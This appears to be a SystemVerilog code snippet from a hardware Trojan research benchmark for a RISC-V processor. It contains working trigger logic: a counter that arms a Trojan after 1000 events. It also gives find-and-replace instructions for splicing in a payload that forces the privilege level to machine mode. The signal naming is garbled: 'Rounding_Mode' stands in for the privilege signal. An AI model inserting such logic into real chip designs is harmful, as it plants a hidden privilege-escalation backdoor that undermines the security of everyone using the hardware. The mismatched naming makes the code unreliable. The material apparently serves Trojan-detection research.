/**
 * Sequential Privilege Escalation Trojan - Code Snippet
 * 
 * Trust-Hub Status: Not applicable (processor-specific)
 * Literature Sources: Bailey 2017, Dessouky et al. 2017, De Clercq & Verbauwhede 2017
 * 
 * Description:
 *   Escalates privilege level to machine mode
 *   
 * Trigger: Counter on Rounding_Mode
 * Payload: Force Rounding_Mode = PRIV_LVL_M
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// RISC-V Privilege Level Constants
// ============================================================

localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode
localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode

// ============================================================
// TROJAN TRIGGER LOGIC (Counter-based)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [31:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        if (Rounding_Mode) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Privilege Escalation: Force Rounding_Mode to Machine mode
//
// Integration Script Must Modify:
//
// IF Rounding_Mode is assigned in always_ff:
//   Find: Rounding_Mode <= next_priv_level;
//   Replace: Rounding_Mode <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF Rounding_Mode is conditional:
//   Find: if (condition) Rounding_Mode <= new_level;
//   Replace: if (condition) Rounding_Mode <= trojan_active ? PRIV_LVL_M : new_level;